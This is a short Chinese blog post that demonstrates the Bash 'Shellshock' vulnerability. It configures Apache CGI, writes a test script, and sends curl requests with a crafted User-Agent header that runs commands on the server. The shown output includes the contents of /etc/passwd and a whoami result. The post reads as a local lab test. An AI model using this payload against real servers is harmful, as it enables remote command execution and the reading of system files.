---
title: Bash shock安全漏洞测试
tags: bash 漏洞
layout: post
---

昨天从微信上面，看到朋友发的最新的bash漏洞信息，感觉真的很可怕，现在互联网公司几乎都有使用到bash。现在我来带领大家实践一下使用这个漏洞的过程。

### 使Apache支持bash cgi
首先要确认Apache里面的CGI模块已经被载入 在httpd.conf 里面有一句：`LoadModule cgi_module modules/mod_cgi.so`这个必须有，然后搜索cgi-bin如果没有的话添加一段`ScriptAlias /cgi-bin/ "/var/www/cgi-bin"`

### 测试bash cgi Hello world
编辑文件：`vim /var/www/cgi-bin/hello.cgi`

    #!/bin/bash
    echo Content-type: text/html
    echo ""
    echo Hello, world.

执行以下命令：

    # chmod 755 /var/www/cgi-bin/hello.cgi`
    # curl localhost/cgi-bin/hello.cgi
    输出以下内容则代表Apache已经支持CGI了，就可以继续我们下面的测试
    Hello, world.

### 最可怕的测试

    localhost ~ # curl -A "() { :; }; echo ; /bin/cat /etc/passwd" http://localhost/cgi-bin/hello.cgi
    root:x:0:0:root:/root:/bin/bash
    bin:x:1:1:bin:/bin:/bin/false
    daemon:x:2:2:daemon:/sbin:/bin/false
    adm:x:3:4:adm:/var/adm:/bin/false
    lp:x:4:7:lp:/var/spool/lpd:/bin/false
    ... ... 

    localhost ~ # curl -A "() { :; }; echo ; /usr/bin/whoami" http://localhost/cgi-bin/hello.cgi
    apache

有牛人对这个漏洞进行了分析，本人表示看不懂，可以看一下
[Bash 3.0-4.3命令执行漏洞分析（by@知道创宇 lu4nx）](http://weibo.com/p/1001603758737234992740)
